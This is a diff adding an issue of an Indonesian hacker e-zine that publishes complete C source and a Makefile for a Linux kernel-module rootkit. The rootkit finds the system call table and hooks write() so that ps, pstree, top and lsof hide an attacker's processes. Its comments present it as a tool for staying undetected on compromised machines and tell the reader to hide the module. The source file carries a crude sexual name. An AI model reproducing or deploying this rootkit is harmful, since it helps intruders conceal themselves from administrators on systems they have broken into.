@@ -1,0 +1,133 @@
+Kecoak Elektronik Indonesia [ KEI ]
+http://www.kecoak-elektronik.net
+
+24 Hours A Day, 300/1200 Baud
+Presents...
+
+
+####################################################################
+TOKET - Terbitan Online Kecoak Elektronik
+Defending the classical hackers mind since 1995
+
+Publisher : http://www.kecoak-elektronik.net
+Contact   : staff@kecoak-elektronik.net
+####################################################################
+
+
+------ leah_dizzon_naked_on_my_bed_tonight_makes_me_so_horny.c ------
+
+/*
+leah_dizzon_naked_on_my_bed_tonight_makes_me_so_horny.c
+Straw Hat of Kecoak Elektronik Rootkit Collection
+"Loadable Kernel Module For Kernel 2.6.9", Ripping from Loadable Kernel By
+you dong-hun(Xpl017Elz) work for kernel 2.4.2, I just do some modifications
+to his code. I've tested this module on kernel 2.6.9-5.ELsmp (Red Hat
+Enterprise Linux Release 4) and worked well.
+*/
+
+#include <linux/slab.h> 
+/* slab.h is header file for kmalloc(), kfree() */
+#include <linux/string.h>
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/moduleparam.h> 
+#include <linux/unistd.h> 
+#include <linux/syscalls.h>
+#include <asm/uaccess.h> 
+
+#define PROGPREFIX "h3ll"
+unsigned char progprefix[0x82]=PROGPREFIX;
+
+int have;
+unsigned long **sys_call_table;
+
+asmlinkage int (*or_write)(u_int fd,u_char *buf,u_int count);
+
+/*
+taken from http://downloads.securityfocus.com/downloads/scprint.tar.gz
+*/
+unsigned long **find_sys_call_table(void) { 
+        unsigned long **sctable; 
+        unsigned long ptr; 
+        extern int loops_per_jiffy; 
+
+        sctable = NULL; 
+        for (ptr = (unsigned long)&loops_per_jiffy; 
+        ptr < (unsigned long)&boot_cpu_data; ptr += sizeof(void *)){ 
+
+                unsigned long *p; 
+                p = (unsigned long *)ptr; 
+                if (p[__NR_close] == (unsigned long) sys_close){ 
+                        sctable = (unsigned long **)p; 
+                        return &sctable[0]; 
+                } 
+        } 
+
+        return NULL; 
+} 
+
+/*
+Modification of write syscall to spoof result of ps, pstree, lsof, and top.
+When you run program on compromised machine, "say it your scanner", faking 
+process can be easily detected by sysadmin.
+
+Using this module we can hide our running program from output ps, pstree,
+lsof, and top. 
+If sysadmin uses "grep", our running program will be detected. But it doesn't 
+matter since sysadmin doesn't know what strings should be "grep"-ed by him.
+*/
+
+asmlinkage int fk_write(u_int fd,u_char *buf,u_int count)
+{
+    char *kbuf=(char*)kmalloc(256,GFP_KERNEL);
+    copy_from_user(kbuf,buf,255); 
+
+
+    if ((strstr(current->comm,"ps"))||
+        (strstr(current->comm,"pstree"))||
+	(strstr(current->comm,"top"))||
+	(strstr(current->comm,"lsof")))
+    {
+        if(strstr(kbuf,progprefix))
+        {
+            kfree(kbuf);
+            return -ENOENT;
+        }
+    }
+
+    kfree(kbuf);
+    have=(*or_write)(fd,buf,count);
+    return have;
+}
+
+int init_module(void)
+{
+    sys_call_table = find_sys_call_table();
+    or_write=sys_call_table[__NR_write];
+    sys_call_table[__NR_write]=fk_write;
+    return 0;
+}
+
+void cleanup_module(void)
+{
+    sys_call_table[__NR_write]=or_write; 
+}
+
+/*
+Hidding this module is your duty, because i don't want to disclose
+complete version of this loadable kernel module rootkit. 
+*/
+
+
+------------------------------ Makefile -------------------------------
+
+obj-m += leah_dizzon_naked_on_my_bed_tonight_makes_me_so_horny.o
+
+all:
+        make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
+
+clean:
+        make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
+
+
+-------------------------------- End ----------------------------------
